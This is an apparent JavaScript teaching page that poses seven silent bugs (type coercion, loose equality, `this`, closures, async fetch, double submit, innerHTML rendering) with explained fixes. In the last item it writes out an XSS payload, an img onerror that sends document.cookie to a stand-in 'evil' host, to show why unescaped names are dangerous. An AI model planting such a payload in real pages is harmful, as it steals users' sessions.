Seven questions about the language. These seven are the bugs, and not one of
them throws. JavaScript's defining characteristic is that it keeps going.

## 1. The total that is a string

```js
const fees = ["45000", "32000", "45000"];
const total = fees.reduce((sum, f) => sum + f, 0);
console.log(total);        // "0450003200045000"
```

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  `+` with a string on either side concatenates. The values came from a form or
  a JSON field and were never numbers.

  ```js
  const total = fees.reduce((sum, f) => sum + Number(f), 0);   // 122000
  ```

  Convert at the **boundary**, where data enters, not at the point of use.
  Otherwise you convert in eleven places and miss the twelfth.

  And `Number("")` is 0 while `Number("abc")` is `NaN`, and `NaN + 5` is `NaN`
  with no error anywhere, which is how a dashboard ends up showing `NaN` to a
  registrar.
  :::
::

## 2. The comparison that is true

```js
console.log(0 == "");        // true
console.log(null == undefined); // true
console.log([] == false);    // true
console.log("0" == false);   // true
```

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  `==` coerces both sides through a set of rules nobody remembers correctly.

  Use `===`, always, with one deliberate exception: `x == null` is a concise
  check for "null or undefined" and is the one case where `==` is idiomatic.

  Where this bites for real:

  ```js
  if (applicant.score == 0) { ... }   // also true for "", [], false
  if (applicant.score === 0) { ... }  // only for the number 0
  ```

  An unmarked application has `score` of `null`, and `null == 0` is `false`
  while `null < 1` is `true`. That inconsistency is why `===` and an explicit
  null check beat cleverness.
  :::
::

## 3. The `this` that is not

```js
class Pipeline {
  constructor() { this.count = 0; }
  attach(button) {
    button.addEventListener("click", function () {
      this.count++;           // TypeError, or silently wrong
    });
  }
}
```

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  A `function` gets its own `this`, bound at call time. In a DOM handler that is
  the element, so `this.count` is `undefined` and `undefined++` is `NaN`.

  ```js
  button.addEventListener("click", () => { this.count++; });
  ```

  An arrow function has no `this` of its own; it uses the enclosing scope's. In
  a class method that is the instance.

  The rule: **arrow functions for callbacks, always.** The only time you want a
  `function` is when you genuinely want the caller to set `this`, which in
  modern code is almost never.
  :::
::

## 4. The loop that logs the wrong number

```js
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}
// 3, 3, 3
```

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  `var` is function-scoped, so all three arrow functions close over the **same**
  `i`. By the time the timeouts run, the loop has finished and `i` is 3.

  ```js
  for (let i = 0; i < 3; i++) { ... }   // 0, 1, 2
  ```

  `let` is block-scoped and the loop creates a fresh binding each iteration.

  This is the most-asked JavaScript interview question after `this`, and the
  answer that wins names the mechanism: closures capture variables, not values,
  and `var` gave them only one variable to capture.
  :::
::

## 5. The data that arrives after the render

```js
let applications = [];
fetch("/api/applications").then(r => r.json()).then(d => applications = d);
render(applications);        // always empty
```

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  `fetch` returns immediately. `render` runs before the response arrives, every
  time, on every machine, including the fast one you tested on.

  ```js
  const res  = await fetch("/api/applications");
  if (!res.ok) throw new Error(`${res.status} ${res.statusText}`);
  render(await res.json());
  ```

  Two things beyond the `await`. **`fetch` does not reject on a 404 or a 500**;
  it only rejects if the request never completed. Checking `res.ok` is not
  optional, and forgetting it means your error handling never runs for the
  errors that actually happen.

  And render a loading state first, because there is always a gap.
  :::
::

## 6. The double submit

```js
submitButton.addEventListener("click", async () => {
  await fetch("/api/enquiries", { method: "POST", body });
  showConfirmation();
});
```

On a slow connection the applicant taps twice and two enquiries are created.

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  Nothing prevents a second click during the request.

  ```js
  let sending = false;
  submitButton.addEventListener("click", async () => {
    if (sending) return;
    sending = true;
    submitButton.disabled = true;
    try {
      const res = await fetch("/api/enquiries", { method: "POST", body });
      if (!res.ok) throw new Error(await res.text());
      showConfirmation();
    } catch (e) {
      showError(e.message);
    } finally {
      sending = false;
      submitButton.disabled = false;
    }
  });
  ```

  `finally` matters: without it, one failure leaves the button disabled forever
  and the applicant has to reload.

  And say the honest part out loud: this is a **kindness**, not a fix. It does
  nothing against a direct request. The real defence is the unique constraint in
  the database, and this only stops the accident.
  :::
::

## 7. The list that rebuilds the world

```js
function render(applications) {
  list.innerHTML = "";
  for (const a of applications) {
    list.innerHTML += `<li>${a.name} - ${a.status}</li>`;
  }
}
```

Called on every keystroke of the filter box. Two bugs.

::accordion
  :::accordion-item{label="Answer" icon="i-lucide-check"}
  **Performance.** `innerHTML +=` reparses the entire list on every iteration,
  so 400 applicants is 400 reparses. Build once:

  ```js
  list.innerHTML = applications
    .map(a => `<li>${escapeHtml(a.name)} - ${a.status}</li>`).join("");
  ```

  **Security, and this is the serious one.** `a.name` goes into HTML
  unescaped. An applicant called `<img src=x onerror="fetch('https://evil/'+document.cookie)">`
  runs code in the registrar's browser, with the registrar's session.

  That is cross-site scripting, it arrived through a form field you let a
  stranger fill in, and it is why the enquiry form's validation and this line
  are the same problem seen twice.

  Either escape on the way in to the HTML, or avoid the problem entirely:

  ```js
  const li = document.createElement("li");
  li.textContent = `${a.name} - ${a.status}`;   // cannot execute anything
  ```

  `textContent` treats everything as text. It is the safe default and it is
  faster.
  :::
::

## The pattern

::pull-quote
Six of these seven run with no error. JavaScript's defining behaviour is that it
keeps going: it coerces, it returns `undefined`, it gives you `NaN`, and the
first sign of trouble is a wrong number on a screen somebody trusts.
::
